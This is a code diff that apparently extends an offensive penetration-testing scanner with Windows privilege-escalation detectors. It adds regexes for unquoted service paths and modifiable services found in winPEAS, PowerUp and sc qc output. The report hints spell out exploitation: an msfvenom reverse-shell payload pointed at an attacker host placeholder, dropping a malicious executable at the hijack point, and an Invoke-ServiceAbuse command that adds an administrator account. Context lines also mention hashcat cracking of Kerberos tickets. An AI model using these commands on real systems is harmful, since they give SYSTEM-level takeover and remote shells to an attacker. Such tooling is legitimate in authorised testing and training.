@@ -2202,6 +2202,36 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-256: Windows privesc chain detectors from captured winPEAS /
+# sc qc / PowerUp / accesschk output.
+#
+# Signal A: unquoted service path with a space - executable hijack
+# candidate. Prior AlwaysInstallElevated covered; unquoted paths
+# were not.
+_UNQUOTED_SERVICE = re.compile(
+    # sc qc format: `BINARY_PATH_NAME   : C:\Program Files\App\svc.exe -args`
+    # unquoted + has space + not starting with " = hijack candidate
+    r'(?im)^\s*BINARY_PATH_NAME\s*:\s*'
+    r'(?!["])(C:\\[^"\r\n]{1,50}\s[^"\r\n]{1,150}\.exe)'
+)
+# Signal B: `Get-ServiceUnquoted` PowerUp result
+_POWERUP_UNQUOTED = re.compile(
+    r'(?im)ServiceName\s*:\s*(\S+)[\s\S]{0,200}?ModifiablePath\s*:\s*'
+    r'(C:\\[^\r\n]{5,200})'
+)
+# Signal C: winPEAS "Modifiable Services" section - captured
+# writable service binary/registry path
+_WINPEAS_MODIFIABLE_SVC = re.compile(
+    # Python 3.11+ rejects mid-pattern global flags; single (?im)
+    # prefix + inner alternation. Prefix decorations widened to
+    # include `==`/`--`/`##` since winPEAS/linPEAS use those as
+    # section-header delimiters.
+    r'(?im)^\s*(?:\|_?\s*|=+\s*|-+\s*|#+\s*)?Modifiable\s+services?'
+    r'\s*(?:=+\s*)?[\r\n]|'
+    r'^\s*(?:\[\+\]\s+)?Services\s+with\s+writable\s+'
+    r'(?:BinaryPath|Path|Config)'
+)
+
 # iter-255: Insecure-deserialization captured payload detector.
 # Fires on the language-specific serialization magic bytes / markers
 # in URLs, POST bodies, or captured HTTP requests. Each match =
@@ -3497,6 +3527,61 @@ def _multiline_passes(path, report, store):
                                      f"hashcat -m 13100 {_sam}.tgs "
                                      f"rockyou.txt -r rules/best64."
                                      f"rule"))
+
+    # iter-256: Windows privesc chain - unquoted service path +
+    # PowerUp modifiable service + winPEAS modifiable-service
+    # section. Doc-file gate applies.
+    if not filters.is_doc_file(path):
+        _uq_seen = set()
+        for _um in _UNQUOTED_SERVICE.finditer(text[:65536]):
+            _binpath = _um.group(1).strip()
+            if _binpath in _uq_seen:
+                continue
+            _uq_seen.add(_binpath)
+            # Extract the first hijack point (first space-broken part
+            # after "C:\").
+            _parts = _binpath.split(" ", 1)
+            _hijack_stub = _parts[0] + ".exe"
+            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_um),
+                       f"Unquoted service path: {_binpath[:80]} - "
+                       f"hijack at {_hijack_stub}",
+                       hint=(f"drop malicious exe named "
+                             f"`{os.path.basename(_hijack_stub)}` at "
+                             f"`{os.path.dirname(_hijack_stub)}\\` -"
+                             f" service starts SYSTEM-priv exe from "
+                             f"first-space-tokenized path  |  "
+                             f"msfvenom -p windows/x64/shell_reverse_"
+                             f"tcp LHOST=<ATT> LPORT=4444 -f exe -o "
+                             f"{os.path.basename(_hijack_stub)} "
+                             f"(counts toward msfvenom quota)  |  "
+                             f"or manual: python2 shellcode-loader.py"
+                             f" + shellcode from msfvenom -f py  |  "
+                             f"needs WRITE perm on the parent dir - "
+                             f"verify with `accesschk64 -uwqs "
+                             f"\"Users\" c:\\`"))
+        for _pm in _POWERUP_UNQUOTED.finditer(text[:65536]):
+            _svc = _pm.group(1).strip()
+            _mpath = _pm.group(2).strip()
+            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_pm),
+                       f"PowerUp modifiable service: {_svc} "
+                       f"(modifiable path: {_mpath[:80]})",
+                       hint=(f"Invoke-ServiceAbuse -Name '{_svc}' "
+                             f"-Command 'C:\\Windows\\System32\\cmd."
+                             f"exe /c net user pwn P@ss1 /add && "
+                             f"net localgroup Administrators pwn "
+                             f"/add'  |  or replace the binary at "
+                             f"{_mpath} + restart service"))
+        _wm = _WINPEAS_MODIFIABLE_SVC.search(text[:32768])
+        if _wm:
+            report.add("MEDIUM", "SECRET-SIDECHANNEL", path, _ln(_wm),
+                       "winPEAS flagged modifiable-service section - "
+                       "check surrounding output for specific service",
+                       hint=("scroll to the Modifiable Services block "
+                             "in winPEAS output; each entry gives a "
+                             "specific svc + write access path  |  "
+                             "for each: sc qc <svc> to confirm SYSTEM "
+                             "context; then replace binary + restart "
+                             "OR use Invoke-ServiceAbuse from PowerUp"))
 
     # iter-255: Insecure-deserialization captured payload. Emits
     # CRITICAL per-language with ysoserial gadget-chain notes.
